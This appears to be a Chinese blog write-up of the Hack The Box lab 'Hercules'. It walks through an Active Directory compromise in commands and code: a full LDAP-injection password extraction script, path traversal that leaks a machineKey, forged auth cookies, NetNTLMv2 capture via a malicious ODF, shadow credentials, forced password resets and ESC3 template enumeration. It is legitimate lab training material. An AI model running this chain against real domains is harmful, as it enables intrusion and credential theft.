---
title: Hercules
date: 2026-08-16 00:00:00
categories:
  - htblabs
tags:
  - HTB
  - Hercules
  - 内网渗透
---

## **Hercules**

### 侦察

```
(root㉿kali)-[~]
└─# nmap -T4 -Pn 10.129.242.196 -A
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 12:01 -0400
Nmap scan report for 10.129.242.196
Host is up (0.43s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-07-27 10:42:25Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
443/tcp  open  ssl/https         Microsoft-IIS/10.0
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp open  ssl/wsmans?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-27T10:44:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: -5h19m05s

TRACEROUTE (using port 139/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.40 seconds

```

域控为dc.hercules.htb

写入/etc/hosts

```
10.129.242.196 dc.hercules.htb hercules.htb DC.hercules.htb
```

访问80端口，找入口

https://10.129.242.196/login

dirsearch扫描

![image-20260727190632400](/images/htblabs/hercules/20260727190632479.png)

有登陆界面

![image-20260727190338278](/images/htblabs/hercules/20260727190338467.png)

#### LDAP 过滤器注入

提取描述
客户端通过提交包含基本和过滤器的搜索请求来查询 LDAP 服务器;如果条目与过滤器匹配，则服务器返回请求的目录信息。LDAP 搜索过滤器遵循 RFC 4515 语法，并表示为括在括号中的属性键/值对;过滤器可以包含通配符，并使用逻辑运算符进行组合。例如，（cn=David*） 匹配以“David”开头的通用名称，（！（cn=David*）） 匹配不以“David”开头的名称，（&（cn=D*）（cn=*Smith）） 应用 AND 条件，并且 （|（cn=David*）（cn=Elisa*）） 应用 OR 条件。**当应用程序将未经验证的用户输入直接嵌入到 LDAP 过滤器中时，就会出现 LDAP 注入漏洞，使攻击者能够纵过滤器逻辑或附加子句来执行意外查询。**此类利用可能会暴露敏感目录数据或绕过身份验证，特别是当 LDAP 服务或应用程序使用过于宽松的权限时。缓解措施需要适当的输入验证和转义（根据 RFC 4515）、使用参数化 LDAP API 或安全的筛选器构建库，以及 LDAP 服务帐户的最小权限原则。
通过利用登录表单中的 LDAP 注入来读取用户对象的描述属性，使用基于前缀的方法逐个字符重建值

“登录尝试失败”表示过滤器返回匹配项（用户名存在或`描述`匹配），而“用户名无效”表示没有匹配项。此侧通道允许基于前缀的逐个字符重建`描述`值。

暴力破解用户名信息

```python
#!/usr/bin/env python3
import requests
import string
import urllib3
import re
import time
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False
# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"
# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)
# All enumerated users (replaced as requested)
KNOWN_USERS = [
   "adriana.i",
   "angelo.o",
   "ashley.b",
   "bob.w",
   "camilla.b",
   "clarissa.c",
   "elijah.m",
   "fiona.c",
   "harris.d",
   "heather.s",
   "jacob.b",
   "jennifer.a",
   "jessica.e",
   "joel.c",
   "johanna.f",
   "johnathan.j",
   "ken.w",
   "mark.s",
   "mikayla.a",
   "natalie.a",
   "nate.h",
   "patrick.s",
   "ramona.l",
   "ray.n",
   "rene.s",
   "shae.j",
   "stephanie.w",
   "stephen.m",
   "tanya.r",
   "tish.c",
   "vincent.g",
   "will.s",
   "zeke.s",
   "auditor"
]
def get_token_and_cookie(session):
   """Get fresh CSRF token and cookies"""
   response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)
   
   token = None
   match = TOKEN_RE.search(response.text)
   if match:
       token = match.group(1)
   
   return token
def test_ldap_injection(username, description_prefix=""):
   """Test if description starts with given prefix using LDAP injection"""
   session = requests.Session()
   
   # Get fresh token
   token = get_token_and_cookie(session)
   if not token:
       return False
   
   # Build LDAP injection payload
   if description_prefix:
       # Escape special characters
       escaped_desc = description_prefix
       if '*' in escaped_desc:
           escaped_desc = escaped_desc.replace('*', '\\2a')
       if '(' in escaped_desc:
           escaped_desc = escaped_desc.replace('(', '\\28')
       if ')' in escaped_desc:
           escaped_desc = escaped_desc.replace(')', '\\29')
       
       payload = f"{username}*)(description={escaped_desc}*"
   else:
       # Check if user has description field
       payload = f"{username}*)(description=*"
   
   # Double URL encode
   encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
   
   data = {
       "Username": encoded_payload,
       "Password": "test",
       "RememberMe": "false",
       "__RequestVerificationToken": token
   }
   
   try:
       response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=5)
       return SUCCESS_INDICATOR in response.text
   except Exception as e:
       return False
def enumerate_description(username):
   """Enumerate description/password field character by character"""
   # Character set - most common password chars first for optimization
   charset = (
       string.ascii_lowercase +
       string.digits +
       string.ascii_uppercase +
       "!@#$_*-." +  # Common special chars
       "%^&()=+[]{}|;:',<>?/`~\" \\"  # Less common
   )
   
   print(f"\n[*] Checking user: {username}")
   
   # First check if user has description
   if not test_ldap_injection(username):
       print(f"[-] User {username} has no description field")
       return None
   
   print(f"[+] User {username} has a description field, enumerating...")
   
   description = ""
   max_length = 50
   no_char_count = 0
   
   for position in range(max_length):
       found = False
       
       for char in charset:
           test_desc = description + char
           
           if test_ldap_injection(username, test_desc):
               description += char
               print(f"    Position {position}: '{char}' -> Current: {description}")
               found = True
               no_char_count = 0
               break
           
           # Small delay to avoid rate limiting
           time.sleep(0.01)
       
       if not found:
           no_char_count += 1
           if no_char_count >= 2:  # Stop after 2 positions with no chars
               break
   
   if description:
       print(f"[+] Complete: {username} => {description}")
       return description
   
   return None
def main():
   print("="*60)
   print("Hercules LDAP Description/Password Enumeration")
   print(f"Testing {len(KNOWN_USERS)} users")
   print("="*60)
   
   found_passwords = {}
   
   # Priority users to test first
   priority_users = ["web_admin", "auditor", "Administrator", "natalie.a", "ken.w"]
   other_users = [u for u in KNOWN_USERS if u not in priority_users]
   
   # Test priority users first
   for user in priority_users + other_users:
       password = enumerate_description(user)
       
       if password:
           found_passwords[user] = password
           
           # Save results immediately
           with open("hercules_passwords.txt", "a") as f:
               f.write(f"{user}:{password}\n")
           
           print(f"\n[+] FOUND: {user}:{password}\n")
   
   print("\n" + "="*60)
   print("ENUMERATION COMPLETE")
   print("="*60)
   
   if found_passwords:
       print(f"\nFound {len(found_passwords)} passwords:")
       for user, pwd in found_passwords.items():
           print(f"  {user}: {pwd}")
   else:
       print("\nNo passwords found")
if __name__ == "__main__":
   main()

```

```
johnathan.j => change*th1s_p@ssw()rd!!
```

验证密码

### 验证环节

```
nxc smb  hercules.htb  -u johnathan.j -p 'change*th1s_p@ssw()rd!!' -d dc.hercules.htb
nxc ldap 10.129.242.196 -u johnathan.j -p 'change*th1s_p@ssw()rd!!' -k
```

![image-20260727192336090](/images/htblabs/hercules/20260727192336184.png)

都失败了

```
登录表单区分响应： 用户名无效与登录尝试失败 。通过注入关闭用户名过滤器并添加 （description=<prefix>*） 的有效负载，后端评估任何对象的描述是否以 <prefix> 开头。
需要双 URL 编码，因为 ASP.NET/IIS 执行临时解码步骤;单编码被清理。该脚本自动逐个字符重建。如果描述包含机密（如此框中所示），则将其恢复。这给了注释中的 change*th1s_p@ssw（）rd！！ 
```

先同步时间，接着爆破

```
nxc ldap 10.129.242.196 -u 'usr/share/seclists/Usernames/top-usernames-shortlist.txt ' -p 'change*th1s_p@ssw()rd!!' --continue-on-success -k
```

```
nxc ldap 10.129.242.196 -u /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p 'change*th1s_p@ssw()rd!!' --continue-on-success
```

确认：密码`change*th1s_p@ssw（）rd！！` 成功验证目标系统上的 `ken.w` 账号。

![image-20260727193354631](/images/htblabs/hercules/20260727193355214.png)

进入控制台

![image-20260727193512108](/images/htblabs/hercules/20260727193512473.png)

### LFI — 获取 `web.config`

我们去 https://hercules.htb/Home/Downloads
选择一个 下载并抓住 burbsuite 的请求

将参数更改为

Request: 请求：

```
GET /Home/Download?fileName=../../web.config
```

![image-20260727195148827](/images/htblabs/hercules/20260727195149032.png)

```
<machineKey decryption="AES" decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581" validation="HMACSHA256" validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />

    <customErrors mode="Off" />
```

点未规范化 fileName — 路径遍历返回 web.config。该文件包含用于加密/签名旧版 ASP.NET FormsAuth cookie 的 machineKey 值（decryptionKey 和 validationKey）。拥有这些钥匙可以锻造 。 应用将接受为合法的 ASPXAUTH Cookie — 实际上是任意 Web 角色模拟（例如，web_admin）。安全地保存配置。

其中 `machineKey` 泄露 + `authentication mode="Forms"` 意味着可以**伪造任意用户的身份认证 Cookie**，无需密码即可登录任何账户。

### 利用 FormsAuthentication 伪造 admin 身份

```
cd ~
wget https://dot.net/v1/dotnet-install.sh
chmod +x dotnet-install.sh
./dotnet-install.sh --channel 8.0
```

用的是这个，最后伪造web_admin

```
(venv)─(root㉿kali)-[~/ForgeCookie]
└─# dotnet run
.ASPXAUTH=D2CAF2E0A9F7602B0CBD01F808151926E048BB6357F92F8EADF31F31B739626C15D265D504331BFC30FBAD66F0E9EBFC320D3EE9EE4D58AA83ADC7742BCD6599FFD7629EBF39C818A92EEC947B771D9AC7E109AF06EEF318B72BFF7E5D9F53A2B730417190FED7C73FE927B425C68759FAE390D80517710E4820FF6CCD29FB7164FF513107349BEF3FCE98BFD960D5772BBCA07FC7EDCA6B678B372F6B54ED51D8FA9FBAF8B37947DFB1E10DB73895329D08C7A0EE7F9F795FDB9BB781FD466D

```

![image-20260727201753030](/images/htblabs/hercules/20260727201753144.png)

![image-20260727202010120](/images/htblabs/hercules/20260727202010611.png)

### 使用 cookie →访问管理员后台→文件上传

其中： `https://hercules.htb/Home/Forms` （仅限管理员上传文件）。

- 通过管理员权限，您可以访问普通用户无法访问的文件上传功能。这样，上传 `Bad.odt` 就可以从可捕获的服务器（或查看器）触发出站资源提取。

  ![image-20260727202134024](/images/htblabs/hercules/20260727202134424.png)

### Bad-ODF 生成和上传→触发 NetNTLMv2

我们使用这个工具 https://github .com/lof1sec/Bad-ODF

```
python3 -m venv .venv
source .venv/bin/activate
mkdir Bad-ODF && cd Bad-ODF
pip install ezodf lxml
wget https://raw.githubusercontent.com/lof1sec/Bad-ODF/refs/heads/main/Bad-ODF.py
python3 Bad-ODF.py   # follow prompts to set your listener IP (tun0)
# upload generated bad.odt via admin upload

```

![image-20260727202539705](/images/htblabs/hercules/20260727202539826.png)

Bad-ODF 制作引用外部 SMB/HTTP 资源（图像/字体)的 ODF 文档。当服务器或客户端呈现文档时，它会尝试获取该外部资源并通过 NetNTLM/NTLMv2 进行身份验证。攻击者捕获质询/响应。这是将网络上传转化为凭证获取的实用方法。

### 捕获并破解 NetNTLMv2

```
responder -I tun0
# After capture, crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt natalie.a.hash

```

```
Prettyprincess123! (natalie.a)  
```

响应程序侦听 SMB/HTTP 并捕获 NetNTLMv2 身份验证尝试。有了足够的处理时间和合理的单词字典，离线破解会产生明文密码（natalie.a，`Prettyprincess123！`） 此密码可解锁 LDAP/AD 作和 BloodHound 枚举。

### BloodHound / AD 枚举

```shell
bloodhound-python -u ken.w -p 'change*th1s_p@ssw()rd!!' -c All -d hercules.htb -ns 10.129.242.196 --zip --use-ldap
```

![image-20260727204738217](/images/htblabs/hercules/20260727204738372.png)

![image-20260727205614590](/images/htblabs/hercules/20260727205614715.png)

**Natalie A. 是 WEB SUPPORT的成员。**

**Web 支持组对六个用户帐户具有 GenericWrite 权限。**

![image-20260727211235419](/images/htblabs/hercules/20260727211235586.png)

**Auditor 和 Ashley B. 是远程管理小组的成员。**

![image-20260728143533239](/images/htblabs/hercules/20260728143533320.png)

**Stephen M. 是安全支持组的成员。**

**安全支持人员组对七个用户帐户具有 ForceChangePassword 权限**

并且又看到stephen.m和mark.s属于Security Helpdesk组，然后Security Helpdesk组对auditor有forcechangepassword权限

![image-20260728143937296](/images/htblabs/hercules/20260728143937382.png)

![image-20260728143708334](/images/htblabs/hercules/20260728143708421.png)

观察到的升级链
初始证书获取。 要求提供 bob.w 的证书，以建立与 bob.w 凭据相关的初始立足点。此活动利用了用户对象上存在的可写属性。
Active Directory 枚举。 为 bob.w 确定了可写 AD 对象和特权属性，包括 Web 部门 OU 中的 CREATE_CHILD 权限和 Stephen M 帐户上的可写属性。
**对象重定位。**Stephen M 的帐户被转移到 Web 部门 OU，更改了其 AD 上下文，并可能更改了它对证书颁发工作流的暴露。
基于证书的帐户滥用。 请求了 stephen.m 的 AD 证书;使用证书身份验证会显示与该帐户关联的凭据（NTLM 等效项目）。
通过组权限提升权限。 通过访问 Stephen M 的帐户，评估发现安全帮助台的 ForceChangePassword 超过 7 个用户包括一个作为远程管理成员的帐户（审计员），从而实现进一步的横向移动和权限提升。

换了个ip

查看证书特权

```
certipy find -u 'natalie.a@dc.hercules.htb' -p 'Prettyprincess123!' \
  -dc-ip 10.129.242.196 -ldap-scheme ldap -ldap-port 389 -ldap-simple-auth
```

![image-20260728110056225](/images/htblabs/hercules/20260728110056395.png)

找到了两个**可被用于 ESC2 和 ESC3 攻击的证书模板**

### 证书攻击（certipy、ESC3 — EnrollmentAgent)

初始证书获取

```shell
# Get TGT for natalie.a
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/natalie.a:Prettyprincess123!

```

![image-20260728111206821](/images/htblabs/hercules/20260728111206886.png)

请求证书

![image-20260728111850964](/images/htblabs/hercules/20260728111851051.png)

执行 **影子凭据攻击**（Shadow Credentials），利用 `natalie.a` 已有的 Kerberos 票据，在 `bob.w` 用户上添加一个攻击者控制的公钥，从而获取 `bob.w` 的访问权限

```shell
# 使用 certipy 来获取/请求证书
export KRB5CCNAME=$(pwd)/natalie.a.ccache
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account bob.w

```

![image-20260728111932249](/images/htblabs/hercules/20260728111932326.png)

得到了bob.w的hash，请求tgt

```
NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
```

![image-20260728112257149](/images/htblabs/hercules/20260728112257221.png)

```
bloodyad -u 'bob.w' -p '' -k -d 'hercules.htb' --host DC.hercules.htb get writable --detail
```

![image-20260728180922020](/images/htblabs/hercules/20260728180922319.png)

主要发现（摘录）：

CREATE_CHILD Web 部门 OU 的权利

distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb — account: CREATE_CHILD
影响：具有此权限的攻击者或遭入侵的帐户可以在 OU 中创建新对象（用户/电脑/服务帐户），这些对象可能会被滥用用于持久化、证书颁发或权限提升。
对 Stephen Miller 的 WRITE 权限

distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb — attributes: name: WRITE, cn: WRITE (and additional writable attributes implied).
影响：属性写入访问权限允许修改用户属性（例如，成员身份、UPN、servicePrincipalName 或 AD CS 使用的敏感属性），这些属性可用于请求证书、更改登录行为或作身份验证。

![image-20260728112951378](/images/htblabs/hercules/20260728112951450.png)

![image-20260728113101563](/images/htblabs/hercules/20260728113101631.png)

Partial entry shown: distinguishedName: CN=Bob Wood,OU=Web Department,OU=... — indicates Bob Wood’s object has writable attributes by the controlling principal.
影响：对高价值用户对象 （Bob） 的可写访问可用于执行证书隐藏、修改认证流程使用的帐户设置，或以其他方式获取该身份的凭证。

带有 ENROLLEE_SUPPLIES_SUBJECT （ESC3） 的 AD 证书服务模板允许滥用，用户可以请求其他实体的证书或提供自己的主题字段。结合可写 ACL 和移动对象，这成为一种无需密码即可为其他用户获取身份验证材料 （PFX/TGT） 的方法。

### 战略性 OU 迁移（powerview)  — 移动到 stephen.m

```shell
安装powerview
pip install "git+https://github.com/aniqfakhrul/powerview.py" --proxy http://192.168.89.1:7898 --break-system-packages --ignore-installed
用powerview以bob.w的票据枚举域内的信息：
powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.129.242.196 -d --no-pass
```

![image-20260728115632692](/images/htblabs/hercules/20260728115632791.png)

```
Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'
```

![image-20260728115805054](/images/htblabs/hercules/20260728115805123.png)

将 stephen.m 移动到具有更宽松的 ACL 继承的 OU（Web 部门）会导致他继承允许证书隐藏或创建子对象的权限。这种“重定位”是更改有效权限并启用后续证书作的战术步骤。
Stephen M. 的帐户已从安全部门 OU 移至 Web 部门 OU，以利用权限继承方面的差异。Web 部门 OU 包含更宽松的 ACL，这些 ACL 使 Stephen M. 的帐户遭受与证书相关的滥用，而这在其原始 OU 中是不可能的。
通过将 stephen.m 移动到 Web 部门 OU，该帐户将继承 OU 的权限（包括 CREATE_CHILD 和其他可写 ACE）。因此，在该 OU 中具有控制权的攻击者或遭到入侵的主体可以：

将密钥凭据添加到 stephen.m 的对象（修改 keyMaterial / keyCredentials）。
利用 AD 证书服务工作流（证书隐藏）对 stephen.m。
获取从基于证书的身份验证派生的身份验证项目（例如，滥用的证书流公开的 NTLM 等效项目）。

### **Certificate Abuse 证书滥用**

我们向 HERCULES 请求 natalie.a 的 Kerberos TGT。

```shell
impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!'
```

```
export KRB5CCNAME=$(pwd)/natalie.a.ccache
klist
请求 stephen.m 的 AD 证书
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'
KRB5CCNAME=natalie.a.ccache certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host DC.hercules.htb -account 'stephen.m'

```

![image-20260728141706563](/images/htblabs/hercules/20260728141706757.png)

```shell
 NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210

```

我们使用 NT 哈希为 stephen.m 请求 Kerberos TGT

**权限提升**

使用 Stephen Miller 的 Kerberos 凭据 （`stephen.m`），我们成功地对审计员帐户的密码执行了受控重置。此过程利用 Kerberos 票证缓存进行安全身份验证，而无需公开纯文本凭据。

```shell
KRB5CCNAME=stephen.m.ccache 
bloodyad --host DC.hercules.htb -d hercules.htb -u 'stephen.m' -k set password Auditor 'Prettyprincess123!'

重置 Auditor 的密码，接管该账户
```

![image-20260728142038307](/images/htblabs/hercules/20260728142038388.png)

请求 Kerberos 票证授予票证 （TGT) 以使审核员帐户在域内安全地进行身份验证

**请求审计员的 Kerberos TGT**

```
impacket-getTGT -dc-ip 10.129.242.196 hercules.htb/Auditor:Prettyprincess123!
```

我们使用 Auditor Kerberos 缓存通过 HTTPS 运行 evil_winrm

用户

![image-20260728142319834](/images/htblabs/hercules/20260728142319908.png)

```shell
git clone https://github.com/ozelis/winrmexec.git
KRB5CCNAME=Auditor.ccache python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb

```

![image-20260728142642482](/images/htblabs/hercules/20260728142642582.png)

### 拿到第一个flag

```
 !stoplog                         # stop logging output to winrmexec_[timestamp]_stdout.log

PS C:\Users\auditor\Documents> cd ../
PS C:\Users\auditor> cd Desktop
PS C:\Users\auditor\Desktop> dir


    Directory: C:\Users\auditor\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         7/28/2026  12:47 PM             34 user.txt                                                              


PS C:\Users\auditor\Desktop> type user.txt
3bdbee964109e870bc36afc5740019ef
PS C:\Users\auditor\Desktop>

```

### 接管 OU

我们拥有**审核员**帐户的 **“Forest Migration”** 组织单元的所有权，并分配 **GenericAll** 权限。

![image-20260728151800793](/images/htblabs/hercules/20260728151800891.png)

我们导入 ActiveDirectory PowerShell 模块

```shell
Import-Module ActiveDirectory
```


我们检查Forest Management 的 Forest Migration OU ACL

```shell
(Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *
```

**“Forest Management”** 组对 **“Forest Migration”**OU 具有两个关键权限：

- **GenericAll** — 授予对 OU 内所有对象的完全控制权，包括创建、修改和删除用户帐户、组和组织单位。

```shell
PS C:\Users\auditor> (Get-ACL "AD:OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb").Access | Where-Object {$_.IdentityReference-like "*Forest Management*"} | Format-List *


ActiveDirectoryRights : GenericRead
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None

ActiveDirectoryRights : GenericAll
InheritanceType       : None
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : HERCULES\Forest Management
IsInherited           : False
InheritanceFlags      : None
PropagationFlags      : None

```

**Forest Migration OU 的所有权分配**

我们将**Forest Migration**组织单位的所有权分配给**审计员**帐户，授予对 OU 内所有对象的完全管理控制权。

```
export KRB5CCNAME=$(pwd)/Auditor.ccache 
bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor

```

![image-20260728152553293](/images/htblabs/hercules/20260728152553371.png)

**审计员 — 实现完全控制**

审计员现在拥有对**“Forest Migration”**OU 的**完全控制**权。

**关键特权/影响**

1. 全面作 OU 中的所有对象（用户、计算机、组）。
2. 能够创建新对象（利用 Windows 计算机管理员可用的 CREATE CHILD 权限）。
3. 能够重置现有用户密码（通过继承的技术支持管理员重置密码权限）。
4. 能够为 RBCD 式攻击准备计算机帐户。

**账户准备**

我们检索了 **Fernando.R** 的 Active Directory 用户详细信息并记录了

```shell
Get-ADUser -Identity "Fernando.R"

```

![image-20260728154521125](/images/htblabs/hercules/20260728154521214.png)

**Group Membership — Fernando.R**

用户 **Fernando.R** 是**Smartcard Operators**组的成员，授予与域内基于智能卡的身份验证和证书管理相关的权限。

同时注意到这个组是一个证书管理组，还是比较有利用价值的，所以现在的目标是获取到`fernando.r`用户的凭据，然后尝试下ADCS

![image-20260728154634835](/images/htblabs/hercules/20260728154634929.png)

**重新启用 Fernando.R 帐户**

```
Get-ADUser -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Filter * -Properties adminCount,UserAccountControl |
  Where-Object { ($_.adminCount -ne 1) -or ($_.adminCount -eq $null) } |
  Select-Object SamAccountName,DistinguishedName,adminCount,UserAccountControl

```

之前禁用的用户帐户 **Fernando.R** 已成功**重新启用** ，恢复了域内的活动访问。

![image-20260728154740020](/images/htblabs/hercules/20260728154740109.png)

### 将 Auditor ou设为Forest Migration：

```shell
bloodyad --host DC.hercules.htb -d hercules.htb -u Auditor -p 'Prettyprincess123!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

我们在给 Forest Migration OU 一个GenericAll权限：

```shell
bloodyad --host dc.hercules.htb -d hercules.htb -u Auditor -k \
add genericAll 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
```

![image-20260728160052542](/images/htblabs/hercules/20260728160052634.png)

启用一下 Fernando.R的账户：

```shell
bloodyad --host DC.hercules.htb -d 'hercules.htb' -u 'auditor' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
```

![image-20260728160221454](/images/htblabs/hercules/20260728160221533.png)

再次查看发现已启用：

```
 Get-ADUser -Identity "Fernando.R"
```

![image-20260728160320390](/images/htblabs/hercules/20260728160320478.png)

重置Fernando.R密码：

```shell
bloodyad --host DC.hercules.htb -d hercules.htb -u Auditor -k set password 'fernando.r' 'NewPassword123!'
```

![image-20260728160442894](/images/htblabs/hercules/20260728160442978.png)

### adcs 证书攻击 ESC3 （fernando.r）

Smartcard Operators Group
Smartcard Operators组的成员对密钥模板具有默认的 “注册 ”权限，允许他们请求和管理智能卡证书。
作为成员，Fernando.R 可以请求和获取域帐户的证书。虽然这是用于合法的智能卡管理，但它可能会被滥用用于域中的权限升级 。

请求 fernando.r 的 Kerberos TGT（使用提供的密码）
使用提供的密码为 fernando.r 请求了 Kerberos 票证授予票证 （TGT）。获取 TGT 并将其存储在会话缓存中，以启用后续的 Kerberos 身份验证作。

```shell
impacket-getTGT 'HERCULES.HTB/fernando.r:NewPassword123!'
```

搜索易受攻击的模板

```shell
export KRB5CCNAME=$(pwd)/fernando.r.ccache

certipy-ad find -k -dc-ip 10.129.242.196 -target DC.hercules.htb -vulnerable -stdout

```

```
                                      HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
  2
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Certificate Authorities             : CA-HERCULES
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-12-04T01:44:26+00:00
    Template Last Modified              : 2024-12-04T01:44:51+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : HERCULES.HTB\Smartcard Operators
                                          HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : HERCULES.HTB\Enterprise Admins
        Full Control Principals         : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Owner Principals          : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Dacl Principals           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
        Write Property Enroll           : HERCULES.HTB\Domain Admins
                                          HERCULES.HTB\Enterprise Admins
    [+] User Enrollable Principals      : HERCULES.HTB\Smartcard Operators
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.

```

